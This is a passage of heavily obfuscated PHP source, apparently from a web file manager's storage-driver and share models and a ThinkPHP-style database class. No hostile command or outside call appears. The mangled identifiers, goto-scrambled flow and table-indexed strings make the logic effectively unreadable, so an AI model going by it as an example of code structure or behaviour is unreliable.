rtrim($EŸ…ÏÑªõ[$EÈ„ÅÕ§Ş±[1012]], $EÈ„ÅÕ§Ş±[8]) . $EÈ„ÅÕ§Ş±[8]; $F¾Ã’ƒö‰ = $this->driverType($dğ¥¸¸„›†); goto a„ò™¤‹; FÒõåöÇ­á: } private function driverType($CééõÊ»‹) { $ešç„œÜ­Î =& $_SERVER[»„]; $DœæÂ«˜Ûõ = array($ešç„œÜ­Î[101] => $ešç„œÜ­Î[2337], $ešç„œÜ­Î[58] => $ešç„œÜ­Î[2338], $ešç„œÜ­Î[64] => $ešç„œÜ­Î[2339]); if (isset($DœæÂ«˜Ûõ[$CééõÊ»‹])) { return $DœæÂ«˜Ûõ[$CééõÊ»‹]; } return strtoupper($CééõÊ»‹); } public function driverListSystem() { $e¬­º›°ß¹ =& $_SERVER[»„]; $FÉ«Øâ‰¢Ç = parent::listData(); $aÉî…ñŒ¨Ô = array(); foreach ($FÉ«Øâ‰¢Ç as $EŞá÷ÖÙŒ) { unset($EŞá÷ÖÙŒ[$e¬­º›°ß¹[183]], $EŞá÷ÖÙŒ[$e¬­º›°ß¹[106]]); $EŞá÷ÖÙŒ[$e¬­º›°ß¹[6]] = json_decode($EŞá÷ÖÙŒ[$e¬­º›°ß¹[6]], !0); $aÉî…ñŒ¨Ô[] = $EŞá÷ÖÙŒ; } return $aÉî…ñŒ¨Ô; } public function defaultDriver() { $CÒİ²„ƒøµ =& $_SERVER[»„]; $BØ×õ‚¦²… = parent::listData(); $a§Ÿ¤ôæ‘… = array_filter_by_field($BØ×õ‚¦²…, $CÒİ²„ƒøµ[34], 1); $a§Ÿ¤ôæ‘… = $a§Ÿ¤ôæ‘…[0]; if ($a§Ÿ¤ôæ‘…) { $a§Ÿ¤ôæ‘…[$CÒİ²„ƒøµ[6]] = json_decode($a§Ÿ¤ôæ‘…[$CÒİ²„ƒøµ[6]], !0); } return $a§Ÿ¤ôæ‘…; } public function driverInfo($bÃäòŸ¶¹˜) { $aÏ®È®¿ë¤ =& $_SERVER[»„]; $Eùó„Êèé = array_to_keyvalue(parent::listData(), $aÏ®È®¿ë¤[363]); if (!isset($Eùó„Êèé[$bÃäòŸ¶¹˜])) { return !1; } $a°¹Ä¾Ùà‡ = $Eùó„Êèé[$bÃäòŸ¶¹˜]; $a°¹Ä¾Ùà‡[$aÏ®È®¿ë¤[6]] = json_decode($a°¹Ä¾Ùà‡[$aÏ®È®¿ë¤[6]], !0); return $a°¹Ä¾Ùà‡; } public function remove($aÔ•ÈÜ‚ç) { $this->removeShareItems($aÔ•ÈÜ‚ç); return parent::remove($aÔ•ÈÜ‚ç); } public function removeWithFile($AÉ¸˜—¨ùÆ) { goto C™ÎÉè¬¬ô; C™ÎÉè¬¬ô: $A‚…áï§½Ğ =& $_SERVER[»„]; $eó„Œù´†• = array($A‚…áï§½Ğ[731] => $AÉ¸˜—¨ùÆ); $c‘Š°ÁŒ× = Model($A‚…áï§½Ğ[418])->where($eó„Œù´†•)->count(); goto CŸ¤ÌÛäÌ×; CŸ¤ÌÛäÌ×: $eËå»Ú¡“ = Model($A‚…áï§½Ğ[418])->where($eó„Œù´†•)->sum($A‚…áï§½Ğ[77]); $FöõïğË–¨ = $A‚…áï§½Ğ[2340] . $AÉ¸˜—¨ùÆ; $cÚ…ÜŞ”È = new TaskFileTransfer($FöõïğË–¨, $A‚…áï§½Ğ[2341], $c‘Š°ÁŒ×, LNG($A‚…áï§½Ğ[2342]) . "\x28{$AÉ¸˜—¨ùÆ}\x29"); goto fÂòŒğ§•; fÈÄ‰½÷: $F¦Û³Ú°ÅŞ = Model($A‚…áï§½Ğ[163])->where($eó„Œù´†•)->field($A‚…áï§½Ğ[2343])->select(); foreach ($F¦Û³Ú°ÅŞ as $AÍîò¤¾÷¼) { goto cªİÉ¾ßè; A‚´‚Ëù•©: $b¢öÁ°‘˜° = array($A‚…áï§½Ğ[731] => $eµË„£ÄÎ‚, $A‚…áï§½Ğ[75] => $BÍç˜­áÓ); Model($A‚…áï§½Ğ[163])->where($eó„Œù´†•)->save($b¢öÁ°‘˜°); goto AíÁÓƒ½Ğ”; cªİÉ¾ßè: $A·â’‚‡Ş = $AÍîò¤¾÷¼[$A‚…áï§½Ğ[75]]; $BÍç˜­áÓ = $B¨ì„˜ŒğÌ . str_replace("\x7b\x69\x6f\72{$AÉ¸˜—¨ùÆ}\x7d\x2f", $A‚…áï§½Ğ[33], $A·â’‚‡Ş); if (!IO::exist($A·â’‚‡Ş)) { $Cõ²ÒÇÒÜ‹[] = $AÍîò¤¾÷¼[$A‚…áï§½Ğ[415]]; $cÚ…ÜŞ”È->updateFileEnd($AÍîò¤¾÷¼[$A‚…áï§½Ğ[28]], $AÍîò¤¾÷¼[$A‚…áï§½Ğ[77]]); continue; } goto c™÷©—–øĞ; c™÷©—–øĞ: if (IO::exist($BÍç˜­áÓ)) { $cÚ…ÜŞ”È->updateFileEnd($AÍîò¤¾÷¼[$A‚…áï§½Ğ[28]], $AÍîò¤¾÷¼[$A‚…áï§½Ğ[77]]); continue; } if (!IO::move($A·â’‚‡Ş, get_path_father($BÍç˜­áÓ))) { $A§££×ŒÓ = !1; break; } $eó„Œù´†• = array($A‚…áï§½Ğ[415] => $AÍîò¤¾÷¼[$A‚…áï§½Ğ[415]]); goto A‚´‚Ëù•©; AíÁÓƒ½Ğ”: } $this->removeByFileID($Cõ²ÒÇÒÜ‹); goto BÙŠ¬İ”¶«; BÙŠ¬İ”¶«: if (!$A§££×ŒÓ) { $cÚ…ÜŞ”È->stop($FöõïğË–¨); return !1; } $cÚ…ÜŞ”È->end(); $this->remove($AÉ¸˜—¨ùÆ); goto eŸÇÍŠï›§; fÂòŒğ§•: $cÚ…ÜŞ”È->task[$A‚…áï§½Ğ[686]] = (double) $eËå»Ú¡“; $dˆ£Ç¢ù² = KodIO::defaultDriver(); $eµË„£ÄÎ‚ = $dˆ£Ç¢ù²[$A‚…áï§½Ğ[363]]; goto AƒåĞ ¯Ú ; AƒåĞ ¯Ú : $B¨ì„˜ŒğÌ = "\173\x69\x6f\x3a{$eµË„£ÄÎ‚}\x7d\x2f"; $A§££×ŒÓ = !0; $Cõ²ÒÇÒÜ‹ = array(); goto fÈÄ‰½÷; eŸÇÍŠï›§: } public function progress($bÑßÓœ Â) { return Task::get($_SERVER[»„][2340] . $bÑßÓœ Â); } private function removeByFileID($B¶êõŞøÍ = array()) { goto Bëë²çÌæ; c°ø‘«…’: $B‰ª Éö = Model($EçÎÇÒ¾[1098])->where($CÇ‘îÅñ‘Â)->field($EçÎÇÒ¾[365])->select(); if (!$B‰ª Éö) { return; } $B‰ª Éö = array_to_keyvalue($B‰ª Éö, $EçÎÇÒ¾[33], $EçÎÇÒ¾[365]); goto e‘ì‹Ë®Œ¥; e‘ì‹Ë®Œ¥: foreach ($B‰ª Éö as $E—éš›‰›¾) { Model($EçÎÇÒ¾[378])->removeNow($E—éš›‰›¾, !1); } goto f‡ãàã±‚î; Bëë²çÌæ: $EçÎÇÒ¾ =& $_SERVER[»„]; if (empty($B¶êõŞøÍ)) { return; } $CÇ‘îÅñ‘Â = array($EçÎÇÒ¾[415] => array($EçÎÇÒ¾[7], $B¶êõŞøÍ)); goto c°ø‘«…’; f‡ãàã±‚î: } private function removeShareItems($cƒ­²°®­Ã) { goto DÏŞÂÀ²‡¾; DÏŞÂÀ²‡¾: $aƒ»ÅãÎäµ =& $_SERVER[»„]; $c™ÉàÊß°ï = "\x7b\151\x6f\x3a{$cƒ­²°®­Ã}\175\x2f"; $FéÛ¦ïÈ = array($aƒ»ÅãÎäµ[365] => 0, $aƒ»ÅãÎäµ[1006] => array($aƒ»ÅãÎäµ[739], "{$c™ÉàÊß°ï}\45")); goto aÎÃº®É¶â; aÎÃº®É¶â: $dÆÒçƒ×œ = Model($aƒ»ÅãÎäµ[2049])->where($FéÛ¦ïÈ)->field($aƒ»ÅãÎäµ[437])->select(); if (empty($dÆÒçƒ×œ)) { return; } $F´‰ ŸŸà = array_to_keyvalue($dÆÒçƒ×œ, $aƒ»ÅãÎäµ[33], $aƒ»ÅãÎäµ[437]); goto Aô•…Şµ; Aô•…Şµ: Model($aƒ»ÅãÎäµ[532])->remove($F´‰ ŸŸà); goto d¢„è„¬Í; d¢„è„¬Í: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x4c\151\147\150\x74\x41\x70\x70"; public $modelType = "\x53\x79\163\164\x65\155\117\160\164\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x67\x72\157\x75\160", "\x64\x65\x73\x63", "\x63\x6f\x6e\x74\x65\x6e\164"); public function listData($FØÅÉ”¯Ê­ = false, $a‹ùóœ’™… = "\155\x6f\x64\x69\x66\x79\124\x69\155\145", $bØÜóÇ—÷õ = true) { return parent::listData($FØÅÉ”¯Ê­, $a‹ùóœ’™…, $bØÜóÇ—÷õ); } public function remove($a†ÃÔè”ÂÔ) { $a‘Ø‡×œÙ = $this->findByName($a†ÃÔè”ÂÔ); if (!$a‘Ø‡×œÙ) { return !1; } return parent::remove($a‘Ø‡×œÙ[$_SERVER[»„][363]]); } public function add($CºÍò¯÷¸) { if ($this->findByName($CºÍò¯÷¸[$_SERVER[»„][28]])) { return !1; } return parent::insert($CºÍò¯÷¸); } public function update($bØí®ì×Ü, $d¦’çÓ¥³·) { $C‹ÉÁ«Ã × =& $_SERVER[»„]; $C´³ˆƒòÇ = $this->findByName($bØí®ì×Ü); $b·ˆğÔ“½ = $this->findByName($d¦’çÓ¥³·[$C‹ÉÁ«Ã ×[28]]); if (!$C´³ˆƒòÇ || $b·ˆğÔ“½ && $b·ˆğÔ“½[$C‹ÉÁ«Ã ×[363]] != $C´³ˆƒòÇ[$C‹ÉÁ«Ã ×[363]]) { return !1; } return parent::update($C´³ˆƒòÇ[$C‹ÉÁ«Ã ×[363]], $d¦’çÓ¥³·); } } goto D—‚Ï±šÒ; e¦´³Í¡ÇÏ: class DbSqlite3 extends DbSqlite3Base { public function query($F¯ ´´ÃÕ‰) { goto eãö´ùÃ½; d™¨—Û±ˆ„: if (!$dƒ­Êìƒ¤Í) { return !1; } if (flock($dƒ­Êìƒ¤Í, LOCK_EX)) { $EôåÕ‚Áğ÷ = parent::query($F¯ ´´ÃÕ‰); flock($dƒ­Êìƒ¤Í, LOCK_UN); fclose($dƒ­Êìƒ¤Í); return $EôåÕ‚Áğ÷; } flock($dƒ­Êìƒ¤Í, LOCK_UN); goto bçÁÉÙæÓŠ; eãö´ùÃ½: $A¶ëÑ©©Ö› =& $_SERVER[»„]; $A÷æ×…È§ä = DATA_PATH . $A¶ëÑ©©Ö›[862]; $dƒ­Êìƒ¤Í = fopen($A÷æ×…È§ä, $A¶ëÑ©©Ö›[863]); goto d™¨—Û±ˆ„; bçÁÉÙæÓŠ: fclose($dƒ­Êìƒ¤Í); show_json($A¶ëÑ©©Ö›[864], !1); return !1; goto eå¦ğ†„×à; eå¦ğ†„×à: } public function execute($bŒàŸ—¡Ç) { goto FíÔ˜®‘áñ; FíÔ˜®‘áñ: $B×êäõ±É =& $_SERVER[»„]; $Eå¥è§Æ  = DATA_PATH . $B×êäõ±É[862]; $b—Ï‡ùàó„ = fopen($Eå¥è§Æ , $B×êäõ±É[863]); goto F‚ÄêÕÅã; C¤ÑÅÓ†ÌÃ: fclose($b—Ï‡ùàó„); show_json($B×êäõ±É[864], !1); return !1; goto EŞ¿÷½‰¦; F‚ÄêÕÅã: if (!$b—Ï‡ùàó„) { return !1; } if (flock($b—Ï‡ùàó„, LOCK_EX)) { $d²Œé…¿Ô¯ = parent::execute($bŒàŸ—¡Ç); flock($b—Ï‡ùàó„, LOCK_UN); fclose($b—Ï‡ùàó„); return $d²Œé…¿Ô¯; } flock($b—Ï‡ùàó„, LOCK_UN); goto C¤ÑÅÓ†ÌÃ; EŞ¿÷½‰¦: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\156\145\x71" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\x74" => "\x3e\75", "\x6c\164" => "\74", "\x65\x6c\164" => "\74\75", "\156\157\x74\x6c\x69\x6b\145" => "\x4e\x4f\x54\40\114\x49\x4b\x45", "\154\151\153\x65" => "\x4c\x49\x4b\x45", "\151\x6e" => "\111\x4e", "\156\157\x74\151\x6e" => "\x4e\x4f\124\40\111\x4e", "\x6e\x6f\164\x20\151\156" => "\116\x4f\124\x20\111\116", "\x62\x65\164\x77\x65\x65\156" => "\x42\105\x54\127\105\x45\116", "\x6e\x6f\164\142\x65\164\167\x65\145\x6e" => "\116\117\124\40\102\x45\x54\127\x45\105\116", "\x6e\157\164\40\x62\145\164\x77\145\x65\x6e" => "\x4e\x4f\124\x20\102\x45\124\127\105\105\116"); protected $selectSql = "\123\105\114\x45\103\124\x25\x44\111\x53\x54\x49\116\103\x54\45\40\x25\x46\111\x45\x4c\x44\x25\x20\x46\122\117\115\x20\45\124\x41\x42\114\x45\x25\x25\112\117\111\x4e\x25\x25\127\110\x45\122\105\45\x25\x47\x52\117\125\120\x25\45\x48\101\126\111\116\107\x25\45\x4f\122\104\x45\122\45\45\114\111\115\111\x54\45\x20\x25\125\116\111\x4f\x4e\45\45\103\117\x4d\115\105\116\x54\45"; protected $bind = array(); public static function getInstance() { $f”‘É˜Ì› = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[»„][865], $f”‘É˜Ì›); } public function factory($fØÈÅ‚„ƒÌ = '') { goto DİÛÑìÃŒ; DİÛÑìÃŒ: $fä‰ÕÙöƒ =& $_SERVER[»„]; $fØÈÅ‚„ƒÌ = $this->parseConfig($fØÈÅ‚„ƒÌ); if (empty($fØÈÅ‚„ƒÌ[$fä‰ÕÙöƒ[866]])) { think_exception(think_lang($fä‰ÕÙöƒ[867])); } goto fã‰êäƒËŸ; cİŞóÏØùÑ: return $E«¾Œ‘’å„; goto b“Ëæéñ†Í; fã‰êäƒËŸ: $this->dbType = ucwords(strtolower($fØÈÅ‚„ƒÌ[$fä‰ÕÙöƒ[866]])); $FÅ˜ßøƒªğ = $fä‰ÕÙöƒ[868] . $this->dbType; if (class_exists($FÅ˜ßøƒªğ)) { $E«¾Œ‘’å„ = new $FÅ˜ßøƒªğ($fØÈÅ‚„ƒÌ); if ($fä‰ÕÙöƒ[712] != strtolower($fØÈÅ‚„ƒÌ[$fä‰ÕÙöƒ[866]])) { $E«¾Œ‘’å„->dbType = strtoupper($this->dbType); } else { $E«¾Œ‘’å„->dbType = $this->_getDsnType($fØÈÅ‚„ƒÌ[$fä‰ÕÙöƒ[818]]); } } else { think_exception(think_lang($fä‰ÕÙöƒ[869]) . $fä‰ÕÙöƒ[870] . $FÅ˜ßøƒªğ); } goto cİŞóÏØùÑ; b“Ëæéñ†Í: } public function __call($a™Œ¥æ æƒ, $dß£çğº‹ë) { if (method_exists($this, $a™Œ¥æ æƒ)) { return call_user_func_array(array($this, $a™Œ¥æ æƒ), $dß£çğº‹ë); } } protected function _getDsnType($FÜƒã¶˜Ÿ†) { $cĞ˜²å·Şö = explode($_SERVER[»„][4], $FÜƒã¶˜Ÿ†); $bøÇî½Éª˜ = strtoupper(trim($cĞ˜²å·Şö[0])); return $bøÇî½Éª˜; } private function parseConfig($cè©ÇƒÑº = '') { $FÆ·ß³Å =& $_SERVER[»„]; if (!empty($cè©ÇƒÑº) && is_string($cè©ÇƒÑº)) { $cè©ÇƒÑº = $this->parseDSN($cè©ÇƒÑº); } elseif (is_array($cè©ÇƒÑº)) { $cè©ÇƒÑº = array_change_key_case($cè©ÇƒÑº); $cè©ÇƒÑº = array($FÆ·ß³Å[866] => $cè©ÇƒÑº[$FÆ·ß³Å[711]], $FÆ·ß³Å[791] => $cè©ÇƒÑº[$FÆ·ß³Å[871]], $FÆ·ß³Å[792] => $cè©ÇƒÑº[$FÆ·ß³Å[872]], $FÆ·ß³Å[789] => $cè©ÇƒÑº[$FÆ·ß³Å[873]], $FÆ·ß³Å[790] => $cè©ÇƒÑº[$FÆ·ß³Å[874]], $FÆ·ß³Å[17] => $cè©ÇƒÑº[$FÆ·ß³Å[875]], $FÆ·ß³Å[818] => $cè©ÇƒÑº[$FÆ·ß³Å[713]], $FÆ·ß³Å[13] => isset($cè©ÇƒÑº[$FÆ·ß³Å[876]]) ? $cè©ÇƒÑº[$FÆ·ß³Å[876]] : array()); } elseif (empty($cè©ÇƒÑº)) { if (think_config($FÆ·ß³Å[877]) && $FÆ·ß³Å[712] != strtolower(think_config($FÆ·ß³Å[878]))) { $cè©ÇƒÑº = $this->parseDSN(think_config($FÆ·ß³Å[877])); } else { $cè©ÇƒÑº = array($FÆ·ß³Å[866] => think_config($FÆ·ß³Å[878]), $FÆ·ß³Å[791] => think_config($FÆ·ß³Å[879]), $FÆ·ß³Å[792] => think_config($FÆ·ß³Å[880]), $FÆ·ß³Å[789] => think_config($FÆ·ß³Å[881]), $FÆ·ß³Å[790] => think_config($FÆ·ß³Å[882]), $FÆ·ß³Å[17] => think_config($FÆ·ß³Å[230]), $FÆ·ß³Å[818] => think_config($FÆ·ß³Å[877]), $FÆ·ß³Å[13] => think_config($FÆ·ß³Å[883])); } } return $cè©ÇƒÑº; } protected function initConnect($d»Ï·¾£Ø¿ = true) { if (1 == think_config($_SERVER[»„][18])) { $this->_linkID = $this->multiConnect($d»Ï·¾£Ø¿); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($C¡Í”„±Ä = false) { $BŒ­‘ĞùÈŒ =& $_SERVER[»„]; static $bÁ—‡šê¨Í = array(); if (empty($bÁ—‡šê¨Í)) { foreach ($this->config as $C·ÏéˆÖ—È => $e’×½‹Ë—) { $bÁ—‡šê¨Í[$C·ÏéˆÖ—È] = explode($BŒ­‘ĞùÈŒ[47], $e’×½‹Ë—); } } if (think_config($BŒ­‘ĞùÈŒ[884])) { if ($C¡Í”„±Ä) { $d¨Â¤Á‰ÇÌ = floor(mt_rand(0, think_config($BŒ­‘ĞùÈŒ[885]) - 1)); } else { if (is_numeric(think_config($BŒ­‘ĞùÈŒ[886]))) { $d¨Â¤Á‰ÇÌ = think_config($BŒ­‘ĞùÈŒ[886]); } else { $d¨Â¤Á‰ÇÌ = floor(mt_rand(think_config($BŒ­‘ĞùÈŒ[885]), count($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[789]]) - 1)); } } } else { $d¨Â¤Á‰ÇÌ = floor(mt_rand(0, count($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[789]]) - 1)); } $fŸÏŠÁÛ¥ = array($BŒ­‘ĞùÈŒ[791] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[791]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[791]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[791]][0], $BŒ­‘ĞùÈŒ[792] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[792]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[792]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[792]][0], $BŒ­‘ĞùÈŒ[789] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[789]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[789]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[789]][0], $BŒ­‘ĞùÈŒ[790] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[790]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[790]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[790]][0], $BŒ­‘ĞùÈŒ[17] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[17]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[17]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[17]][0], $BŒ­‘ĞùÈŒ[818] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[818]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[818]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[818]][0], $BŒ­‘ĞùÈŒ[13] => isset($bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[13]][$d¨Â¤Á‰ÇÌ]) ? $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[13]][$d¨Â¤Á‰ÇÌ] : $bÁ—‡šê¨Í[$BŒ­‘ĞùÈŒ[13]][0]); return $this->connect($fŸÏŠÁÛ¥, $d¨Â¤Á‰ÇÌ); } public function parseDSN($bÉ¹Œ¬»è¿) { $A¨„¦Ñ»ì± =& $_SERVER[»„]; if (empty($bÉ¹Œ¬»è¿)) { return !1; } $Cì¼‡Óˆ = parse_url($bÉ¹Œ¬»è¿); if ($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[164]]) { $b‘‚ù­ôæ = array($A¨„¦Ñ»ì±[866] => $Cì¼‡Óˆ[$A¨„¦Ñ»ì±[164]], $A¨„¦Ñ»ì±[791] => isset($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[531]]) ? $Cì¼‡Óˆ[$A¨„¦Ñ»ì±[531]] : $A¨„¦Ñ»ì±[33], $A¨„¦Ñ»ì±[792] => isset($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[887]]) ? $Cì¼‡Óˆ[$A¨„¦Ñ»ì±[887]] : $A¨„¦Ñ»ì±[33], $A¨„¦Ñ»ì±[789] => isset($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[165]]) ? $Cì¼‡Óˆ[$A¨„¦Ñ»ì±[165]] : $A¨„¦Ñ»ì±[33], $A¨„¦Ñ»ì±[790] => isset($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[166]]) ? $Cì¼‡Óˆ[$A¨„¦Ñ»ì±[166]] : $A¨„¦Ñ»ì±[33], $A¨„¦Ñ»ì±[17] => isset($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[75]]) ? substr($Cì¼‡Óˆ[$A¨„¦Ñ»ì±[75]], 1) : $A¨„¦Ñ»ì±[33]); } else { preg_match($A¨„¦Ñ»ì±[888], trim($bÉ¹Œ¬»è¿), $b­›½½ƒŠ»); $b‘‚ù­ôæ = array($A¨„¦Ñ»ì±[866] => $b­›½½ƒŠ»[1], $A¨„¦Ñ»ì±[791] => $b­›½½ƒŠ»[2], $A¨„¦Ñ»ì±[792] => $b­›½½ƒŠ»[3], $A¨„¦Ñ»ì±[789] => $b­›½½ƒŠ»[4], $A¨„¦Ñ»ì±[790] => $b­›½½ƒŠ»[5], $A¨„¦Ñ»ì±[17] => $b­›½½ƒŠ»[6]); } $b‘‚ù­ôæ[$A¨„¦Ñ»ì±[818]] = $A¨„¦Ñ»ì±[33]; return $b‘‚ù­ôæ; } protected function debug() { $eÙ½Š‚ =& $_SERVER[»„]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $eÙ½Š‚[889]; if (think_config($eÙ½Š‚[890])) { think_status($eÙ½Š‚[891]); think_trace($this->queryStr . $eÙ½Š‚[892] . think_status($eÙ½Š‚[20], $eÙ½Š‚[891], 6) . $eÙ½Š‚[893], $eÙ½Š‚[33], $eÙ½Š‚[894]); } } protected function parseLock($fƒóƒÇÖíÔ = false) { $B»ÛáÀÙœ« =& $_SERVER[»„]; if (!$fƒóƒÇÖíÔ) { return $B»ÛáÀÙœ«[33]; } if ($B»ÛáÀÙœ«[820] == $this->dbType) { return $B»ÛáÀÙœ«[895]; } return $B»ÛáÀÙœ«[896]; } protected function parseSet($d†‰Å•£œ›) { $C”ÒİªÔÇË =& $_SERVER[»„]; foreach ($d†‰Å•£œ› as $eÇÙ¦Ä…¹ => $AÙ£·“­Úğ) { if (is_array($AÙ£·“­Úğ) && $C”ÒİªÔÇË[281] == $AÙ£·“­Úğ[0]) { $BÃŞŒ¢Í½[] = $this->parseKey($eÇÙ¦Ä…¹) . $C”ÒİªÔÇË[897] . $AÙ£·“­Úğ[1]; } elseif (is_scalar($AÙ£·“­Úğ) || is_null($AÙ£·“­Úğ)) { $BÃŞŒ¢Í½[] = $this->parseKey($eÇÙ¦Ä…¹) . $C”ÒİªÔÇË[897] . $this->parseValue($AÙ£·“­Úğ); } } return $C”ÒİªÔÇË[898] . implode($C”ÒİªÔÇË[47], $BÃŞŒ¢Í½); } protected function bindParam($eÄ½äÎÔ×¡, $D«µ¨ŸµÚˆ) { $this->bind[$_SERVER[»„][4] . $eÄ½äÎÔ×¡] = $D«µ¨ŸµÚˆ; } protected function parseBind($B´”´Ñ„Æ“) { $B´”´Ñ„Æ“ = array_merge($this->bind, $B´”´Ñ„Æ“); $this->bind = array(); return $B´”´Ñ„Æ“; } function parseKey(&$B®‡”õ¼‹¨, $C÷…Íˆ†Şò = true) { if ($C÷…Íˆ†Şò) { $B®‡”õ¼‹¨ = $this->parseKeyCheck($B®‡”õ¼‹¨); } return $B®‡”õ¼‹¨; } function parseKeyCheck($cŞŸ˜óŞ) { $Aö†‰ëÖ¥¬ =& $_SERVER[»„]; $cŞŸ˜óŞ = trim($cŞŸ˜óŞ); if (!preg_match($Aö†‰ëÖ¥¬[899], $cŞŸ˜óŞ)) { think_exception($Aö†‰ëÖ¥¬[900] . $cŞŸ˜óŞ); } return $cŞŸ˜óŞ; } protected function parseValue($bÉª¼é‹) { $bÖ“ì½Ñ± =& $_SERVER[»„]; if (is_string($bÉª¼é‹)) { $bÉª¼é‹ = $bÖ“ì½Ñ±[859] . $this->escapeString($bÉª¼é‹) . $bÖ“ì½Ñ±[859]; } elseif (isset($bÉª¼é‹[0]) && is_string($bÉª¼é‹[0]) && strtolower($bÉª¼é‹[0]) == $bÖ“ì½Ñ±[281]) { $bÉª¼é‹ = $this->escapeString($bÉª¼é‹[1]); } elseif (is_array($bÉª¼é‹)) { $bÉª¼é‹ = array_map(array($this, $bÖ“ì½Ñ±[860]), $bÉª¼é‹); } elseif (is_bool($bÉª¼é‹)) { $bÉª¼é‹ = $bÉª¼é‹ ? $bÖ“ì½Ñ±[83] : $bÖ“ì½Ñ±[464]; } elseif (is_null($bÉª¼é‹)) { $bÉª¼é‹ = $bÖ“ì½Ñ±[99]; } return $bÉª¼é‹; } protected function parseField($F½ÔÒÜŸÈ») { $C·ñ½¿´Ø =& $_SERVER[»„]; if (is_string($F½ÔÒÜŸÈ») && strpos($F½ÔÒÜŸÈ», $C·ñ½¿´Ø[47])) { $F½ÔÒÜŸÈ» = explode($C·ñ½¿´Ø[47], $F½ÔÒÜŸÈ»); } if (is_array($F½ÔÒÜŸÈ»)) { $C•èåœÊ¥È = array(); foreach ($F½ÔÒÜŸÈ» as $f±—‚òŞö´ => $AÔ‡øÏ–‚) { if (!is_numeric($f±—‚òŞö´)) { $C•èåœÊ¥È[] = $this->parseKey($f±—‚òŞö´) . $C·ñ½¿´Ø[901] . $this->parseKey($AÔ‡øÏ–‚); } else { $C•èåœÊ¥È[] = $this->parseKey($AÔ‡øÏ–‚); } } $EİÕÅ³¡É– = implode($C·ñ½¿´Ø[47], $C•èåœÊ¥È); } elseif (is_string($F½ÔÒÜŸÈ») && !empty($F½ÔÒÜŸÈ»)) { $EİÕÅ³¡É– = $F½ÔÒÜŸÈ»; } else { $EİÕÅ³¡É– = $C·ñ½¿´Ø[172]; } return $EİÕÅ³¡É–; } protected function parseTable($BÜ£¼ÂÁÚ¥) { $e©§ªˆ‚Î =& $_SERVER[»„]; if (is_array($BÜ£¼ÂÁÚ¥)) { $c£¨®é¥˜ = array(); foreach ($BÜ£¼ÂÁÚ¥ as $aÁ ½øøÏè => $e´Ü³˜¨–) { if (!is_numeric($aÁ ½øøÏè)) { $c£¨®é¥˜[] = $this->parseKey($aÁ ½øøÏè) . $e©§ªˆ‚Î[50] . $this->parseKey($e´Ü³˜¨–); } else { $c£¨®é¥˜[] = $this->parseKey($aÁ ½øøÏè); } } $BÜ£¼ÂÁÚ¥ = $c£¨®é¥˜; } elseif (is_string($BÜ£¼ÂÁÚ¥)) { if (strstr($BÜ£¼ÂÁÚ¥, $e©§ªˆ‚Î[50])) { return $BÜ£¼ÂÁÚ¥; } $BÜ£¼ÂÁÚ¥ = explode($e©§ªˆ‚Î[47], $BÜ£¼ÂÁÚ¥); array_walk($BÜ£¼ÂÁÚ¥, array($this, $e©§ªˆ‚Î[808])); } return $e©§ªˆ‚Î[902] . trim(implode($e©§ªˆ‚Î[903], $BÜ£¼ÂÁÚ¥), $e©§ªˆ‚Î[814]) . $e©§ªˆ‚Î[902]; } protected function parseWhere($a°ËªäÚî) { $cØõÕ¨Çˆª =& $_SERVER[»„]; $e§î‚ó›ğÕ = $cØõÕ¨Çˆª[33]; if (is_string($a°ËªäÚî)) { $e§î‚ó›ğÕ = $a°ËªäÚî; } else { $FóÇŞÜ§™à = isset($a°ËªäÚî[$cØõÕ¨Çˆª[904]]) ? 